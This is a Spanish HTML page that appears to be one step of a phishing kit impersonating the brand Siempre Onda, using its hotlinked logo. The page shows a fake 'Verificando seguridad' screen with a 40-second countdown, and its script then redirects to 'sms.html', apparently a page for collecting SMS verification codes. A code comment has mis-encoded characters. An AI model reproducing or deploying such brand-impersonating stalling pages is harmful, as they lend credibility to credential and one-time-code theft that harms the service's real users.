<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando - Siempre Onda</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        .logo-header {
            margin-bottom: 50px;
        }
        .logo-header img {
            width: 140px;
        }

        .status-title {
            font-size: 22px;
            font-weight: 700;
            color: #3d3d3d;
            margin-bottom: 10px;
        }

        .status-sub {
            color: #777;
            font-size: 16px;
            margin-bottom: 40px;
            line-height: 1.4;
        }

        /* Temporizador circular profesional */
        .timer-wrapper {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 30px;
        }

        .timer-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 28px;
            font-weight: 700;
            color: #007bff;
        }

        .spinner {
            width: 100px;
            height: 100px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-bar-container {
            width: 100%;
            background-color: #f0f0f0;
            border-radius: 10px;
            height: 6px;
            margin-top: 20px;
            overflow: hidden;
        }

        .loading-bar-fill {
            height: 100%;
            background-color: #007bff;
            width: 100%;
            transition: width 1s linear;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-header">
        <img src="https://siempreonda.com/_next/static/media/logo.242b4c5d.svg" alt="Siempre Onda">
    </div>

    <div class="status-title">Verificando seguridad</div>
    <div class="status-sub">
        Estamos procesando tu acceso. Por favor, no cierres esta ventana.
    </div>

    <div class="timer-wrapper">
        <div class="spinner"></div>
        <div class="timer-text" id="seconds">40</div>
    </div>

    <div class="loading-bar-container">
        <div class="loading-bar-fill" id="bar"></div>
    </div>
</div>

<script>
    let timeLeft = 40;
    const secondsElement = document.getElementById('seconds');
    const barElement = document.getElementById('bar');

    const countdown = setInterval(() => {
        timeLeft--;
        secondsElement.innerText = timeLeft;
        
        // Actualizar barra de progreso proporcionalmente
        let percentage = (timeLeft / 40) * 100;
        barElement.style.width = percentage + "%";

        if (timeLeft <= 0) {
            clearInterval(countdown);
            // REDIRECCIÃ“N A SMS.HTML
            window.location.href = "sms.html";
        }
    }, 1000);
</script>

</body>
</html>
